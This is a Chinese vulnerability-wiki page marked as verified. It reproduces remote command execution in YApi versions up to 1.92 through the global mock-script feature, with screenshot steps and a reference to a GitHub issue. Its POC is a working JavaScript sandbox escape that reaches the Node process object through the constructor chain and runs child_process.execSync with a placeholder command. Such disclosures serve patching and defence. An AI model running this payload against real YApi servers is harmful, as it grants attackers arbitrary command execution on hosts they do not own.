<languages />

<center>
|:-:|:-:|
|![](Check.png "Check.png")|**该漏洞已通过验证**

* * * * *

<small>本页面的EXP/POC/Payload经测试可用，漏洞已经成功复现。</small>|

</center>
影响版本
--------

\<=V1.92 All

漏洞复现
--------

登录注册后，创建一个项目

![](124460388-eaa46100-ddc1-11eb-80c4-2bddb97df8e1.png "124460388-eaa46100-ddc1-11eb-80c4-2bddb97df8e1.png")

<div lang="chinese" dir="ltr" class="mw-content-ltr">
然後選擇設置全局的mock腳本，設置命令為遠程訪問我的服務器地址。

</div>
![](124460511-090a5c80-ddc2-11eb-92f6-46c9b3b498bb.png "124460511-090a5c80-ddc2-11eb-92f6-46c9b3b498bb.png")

<div lang="chinese" dir="ltr" class="mw-content-ltr">
添加接口，訪問接口的mock地址

</div>
![](124460629-2dfecf80-ddc2-11eb-98c3-b96f7174d8f1.png "124460629-2dfecf80-ddc2-11eb-98c3-b96f7174d8f1.png")

<div lang="chinese" dir="ltr" class="mw-content-ltr">
服務器可以看到如下響應

</div>
![](124460757-5686c980-ddc2-11eb-87df-09e0f9ac08af.png "124460757-5686c980-ddc2-11eb-87df-09e0f9ac08af.png")

POC
---

    const sandbox = this
    const ObjectConstructor = this.constructor
    const FunctionConstructor = ObjectConstructor.constructor
    const myfun = FunctionConstructor('return process')
    const process = myfun()
    mockjson = process.mainModule.require("child_process").execSync("command").toString()

<div lang="chinese" dir="ltr" class="mw-content-ltr">
參考
----

</div>
<https://github.com/YMFE/yapi/issues/2233>